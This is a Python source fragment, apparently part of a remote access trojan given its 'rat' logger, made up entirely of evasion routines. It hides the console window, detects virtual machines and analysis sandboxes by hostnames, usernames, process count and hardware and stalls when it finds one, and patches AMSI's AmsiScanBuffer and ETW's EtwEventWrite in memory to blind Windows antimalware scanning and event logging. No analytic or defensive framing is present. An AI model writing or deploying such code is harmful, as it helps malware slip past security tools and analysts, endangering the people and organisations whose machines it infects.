import os
import sys
import time
import random
import socket
import ctypes
import psutil
import logging

log = logging.getLogger("rat")

def hide_console() -> None:
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        log.debug("hide_console: %s", e)

def sandbox_check() -> bool:
    try:
        if len(list(psutil.process_iter())) < 45:
            time.sleep(random.randint(300, 600))
            return True
    except Exception:
        pass
    bad = ("vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox", "sample", "malware", "analysis", "cuckoo")
    try:
        host = socket.gethostname().lower()
        user = os.getlogin().lower()
        if any(x in host or x in user for x in bad):
            time.sleep(random.randint(250, 500))
            return True
    except Exception:
        pass
    try:
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 1.5 * 1024**3:
            time.sleep(random.randint(180, 400))
            return True
    except Exception:
        pass
    time.sleep(random.randint(120, 280))
    return False

def patch_amsi_etw() -> None:
    try:
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        etw = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        if etw:
            old = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(etw, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(etw, b"\xC3", 1)
            ctypes.windll.kernel32.VirtualProtect(etw, 1, old.value, ctypes.byref(old))
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if amsi:
            scan = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if scan:
                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(scan, 6, 0x40, ctypes.byref(old))
                ctypes.memmove(scan, b"\xB8\x57\x00\x07\x80\xC3", 6)
                ctypes.windll.kernel32.VirtualProtect(scan, 6, old.value, ctypes.byref(old))
    except Exception as e:
        log.debug("patch_amsi_etw: %s", e)
